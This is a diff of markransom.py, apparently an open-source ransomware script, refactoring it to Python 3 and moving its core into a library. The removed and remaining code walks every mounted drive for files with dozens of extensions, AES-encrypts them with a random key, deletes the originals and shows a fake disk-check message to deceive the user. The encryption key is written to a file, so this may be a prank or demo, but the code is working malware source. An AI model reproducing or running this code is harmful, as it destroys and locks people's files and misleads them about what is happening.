@@ -3,14 +3,22 @@
 # markransom.py - decipher
 # https://www.github.com/R3nt0n/markransom
 
+
+__author__ = "r3nt0n"
+__license__ = "GPL 3.0"
+__version__ = "1.0.0"
+__email__ = "r3nt0n@protonmail.com"
+__status__ = "Development"
+
+
 import os, subprocess, platform
 from time import time
 from base64 import b64encode
 from random import randint
 
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
-from Crypto.Random import get_random_bytes  # Para generar la clave
+from Crypto.Random import get_random_bytes  # To generate random key
+
+from lib.cryptor import find_root_paths, find_files_and_do
 
 
 ################################################################################
@@ -51,42 +59,11 @@ EXTENSIONS = ['.wb2', '.psd', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt','.c
 
 ########################################################################################################################
 
-def find_root_paths():
-    '''Returns a list with all the partitions/mount points which are currently
-       mounted on the system.'''
-    if os.name == 'nt':
-        possible_units = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-        units_mounted = []
-        for letter in possible_units:
-            mountpoint = os.path.normpath(letter + ':/')
-            if os.path.exists(mountpoint):
-                units_mounted.append(mountpoint)
-        root_paths = units_mounted
-    else:
-        root_paths = ['/']
-
-    return root_paths
-
-
-def find_script_mount_point():
-    '''Returns the mount point where the script is located.'''
-    scriptPath = os.path.abspath(__file__)
-    scriptDir = os.path.dirname(scriptPath)
-    os.chdir(scriptDir)
-
-    while True:
-        os.chdir('..')
-        actualPath = os.path.normpath(os.getcwd())
-        if os.path.ismount(actualPath):
-            script_mount_point = actualPath
-            break
-
-    return script_mount_point
 
 def fake_checkdisk():
-    print u'{} has detected uncleared nodes'.format(platform.system())
-    print u'Starting testdisk tool, please don\'t shutdown your computer'
-    print u'{} disk errors found. Trying to repair disk...'.format(randint(2, 5))
+    print(u'{} has detected uncleared nodes'.format(platform.system()))
+    print(u'Starting testdisk tool, please don\'t shutdown your computer')
+    print(u'{} disk errors found. Trying to repair disk...'.format(randint(2, 5)))
 
 def just_kidding(key_enc, msg):
     if not (MSG_FILE and MSG_FILE):
@@ -107,80 +84,22 @@ def just_kidding(key_enc, msg):
         with open(msg_file, 'wb+') as f_msg:
             f_msg.write(msg)
 
-def find_files(units_mounted, extensions, script_mount_point):
-    '''Walk all units mounted in looking for files that matches one of the
-       extensions. The mount point where the script is located can be excluded.
-
-       Returns a list of files, including the absolute path of each one.
-
-       Arguments:
-       units_mounted -- list of units that will be walked.
-       extensions -- list of extensions that will be searched.
-       script_mount_point -- string with a mount point that will be excluded.
-    '''
-    file_list = []
-
-    for unit in units_mounted:
-        root_path = unit
-
-        for root, dirs, files in os.walk(root_path, topdown=False):
-            for name in files:
-                for extension in extensions:
-                    if name.endswith(extension) \
-                       and not name.startswith(script_mount_point):
-
-                        file_match = os.path.join(root, name)
-                        file_list.append(file_match)
-
-    return file_list
-
-
-def cipher(data, key):
-    '''Encrypt data with AES(CBC mode).
-
-       Returns an string encoded in base64 containing the encrypted data.
-
-       Arguments:
-       data -- the data that will be encrypted.
-       key -- the key for the encryption. For AES256, it has to be 32 bytes.
-    '''
-    data = b64encode(data)
-    c = AES.new(key, AES.MODE_CBC)
-    pad_data = pad(data, c.block_size)
-    cipher_text = c.encrypt(pad_data)  # Aquí tengo el mensaje cifrado
-    cipher_data = c.iv + ':%:%:&:%:%:' + cipher_text
-    return cipher_data
 
 
 ################################################################################
 # SCRIPT-WORKFLOW
 ################################################################################
 def main():
-
     init_time = time()
     fake_checkdisk()
     root_paths = find_root_paths()
-    script_mount_point = find_script_mount_point()
-    file_list = find_files(root_paths, EXTENSIONS, script_mount_point)
     key = get_random_bytes(32)  # Generating a random key
-
     # Encrypting the files
-    for file_path in file_list:
-        try:
-            with open(file_path, 'rb') as file_plain:
-                data = file_plain.read()
-            cipher_data = cipher(data, key)
-            with open(file_path + CUSTOM_EXT, 'wb+') as file_crypted:
-                file_crypted.write(cipher_data)
-            os.remove(file_path)
-        except:
-            pass
-
+    files_crypted = find_files_and_do(root_paths, EXTENSIONS, key, action='encrypt',crypted_ext=CUSTOM_EXT)
     # Calculating encryption time, writing the final message and saving the key.
     end_time = time()
     execution_time = end_time - init_time
-
-    msg = '{} files have been encrypted in {} seconds.{}'.format(str(len(file_list)), str(end_time), MSG)
+    msg = '{} files have been encrypted in {} seconds.{}'.format(str(len(files_crypted)), str(end_time), MSG)
     key_enc = b64encode(key)
     just_kidding(key_enc, msg)
 
